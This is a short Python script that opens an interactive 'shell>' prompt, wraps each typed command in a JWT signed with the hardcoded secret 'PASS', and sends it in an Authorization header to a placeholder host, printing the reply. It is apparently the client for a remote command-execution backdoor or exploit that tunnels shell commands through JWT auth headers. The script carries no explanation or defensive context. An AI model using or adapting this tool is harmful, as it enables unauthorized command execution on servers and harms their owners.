import jwt
import codecs
import requests

while True:
        prompt = "shell> "
        cmd = input(prompt)
        encoded_jwt = jwt.encode({'xxx': cmd}, 'PASS', algorithm='HS256')
        string1_aft_decode = codecs.decode(encoded_jwt)
        payload = 'Bearer ' + string1_aft_decode
        headers = {'authorization': payload}
        x = requests.Session()
        x = requests.get('http://x.x.x.x:xxxx', headers=headers)
        print(x.text)
       
